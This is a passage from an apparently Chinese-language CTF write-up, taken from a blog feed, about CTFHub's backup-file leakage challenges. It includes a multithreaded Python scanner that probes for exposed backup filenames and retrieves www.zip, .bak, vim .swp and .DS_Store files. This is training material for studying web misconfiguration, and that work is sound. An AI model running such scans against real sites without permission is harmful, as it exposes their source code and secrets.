class="line"><span class="keyword">def</span> <span class="title function_">check_url</span>(<span class="params">file_name</span>):</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;url1&#125;</span>/<span class="subst">&#123;file_name&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_name&#125;</span>\n&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error accessing <span class="subst">&#123;url&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用多线程执行URL请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_backup_files</span>():</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">50</span>) <span class="keyword">as</span> executor:  <span class="comment"># 创建50个线程</span></span><br><span class="line">        <span class="comment"># 构造所有的文件名并提交给线程池</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">                back = <span class="string">f&quot;<span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span>&quot;</span>  <span class="comment"># 组合文件名</span></span><br><span class="line">                executor.submit(check_url, back)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行扫描</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;能够访问到的网站后缀有:&quot;</span>)</span><br><span class="line">scan_backup_files()</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>用开源工具进行访问**<a class="link"   href="https://github.com/VMsec/ihoneyBakFileScan_Modify" >ihoneyBakFileScan_Modify <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>**</p>
</li>
</ol>
<p>扫描完会发现能访问到<code>www.zip</code>文件，下载下来后有<code>flag文件</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917142347669.png"
                      alt="image-20240917142347669"
                ></p>
<p>直接打开没有，就在网页访问看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917142416724.png"
                      alt="image-20240917142416724"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240916155518068.png"
                      alt="image-20240916155518068"
                ></p>
<p>恭喜，访问成功！拿到flag。</p></div><div class="tab-pane" id="信息泄露-备份文件下载-2"><h3 id="题目-bak文件"><a href="#题目-bak文件" class="headerlink" title="题目-bak文件"></a>题目-bak文件</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>

  </div>

<p>打开靶场看到提示说flag文件在<code>index.php</code>中，结合题目说明这个文件被备份到<code>.bak</code>文件了，所以我们尝试访问<code>index.php.bak</code>，发现能有文件被下载，打开文件就可以看到flag了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240916160032682.png"
                      alt="image-20240916160032682"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240916160059293.png"
                      alt="image-20240916160059293"
                ></p></div><div class="tab-pane" id="信息泄露-备份文件下载-3"><h3 id="题目-vim缓存"><a href="#题目-vim缓存" class="headerlink" title="题目-vim缓存"></a>题目-vim缓存</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>

  </div>

<blockquote>
<p>vim缓存时linux里面的缓存隐藏文件</p>
</blockquote>
<p>打开靶场，根据题目和看到提示flag在index.php里面，php文件肯定以vim的形式备份了，所以我们以vim缓存文件恢复即可，所以 &#x2F;.index.php.swp 直接下载</p>
  <div class="note p-4 mb-4 rounded-small warning">
    <p>隐藏文件，记得加点访问</p>

  </div>



<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917171052845.png"
                      alt="image-20240917171052845"
                ></p>
<blockquote>
<p>vim的备份文件后缀位.swp，并且需要用<code>vim 文件名（无.swp）</code>来重新访问，windows直接打开是16进制的，更换编码格式为UTF-8，或者用linux系统打开</p>
</blockquote>
<p>打开后就可以找到flag了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917172655327.png"
                      alt="image-20240917172655327"
                ></p></div><div class="tab-pane" id="信息泄露-备份文件下载-4"><h3 id="题目-DS-Store"><a href="#题目-DS-Store" class="headerlink" title="题目-.DS_Store"></a>题目-.DS_Store</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p><code>.DS_Store</code> 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过<code>.DS_Store</code>可以知道这个目录里面所有文件的清单。</p>

  </div>

<p>打开靶场，看到备份文件下载，直接加<code>.DS_Store</code>访问，得到一个下载文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917173751838.png"
                      alt="image-20240917173751838"
                ></p>
<blockquote>
<p>文件需要在linux系统打开，或者在windows系统用UTF-8&#x2F;UTF-16格式打开</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917174419780.png"
                      alt="image-20240917174419780"
                ></p>
<p>发现一串文件名，在靶场中访问看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917174533485.png"
                      alt="image-20240917174533485"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917174538337.png"
                      alt="image-20240917174538337"
                ></p>
<p>成功得到flag！</p></div></div></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些题都属于文件备份不当，导致备份文件泄露，最主要的就是下载后用不同格式打开文件，整体还是简单的</p>
<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;信息泄露-&gt;备份文件下载</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>ctfhub</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
</search>
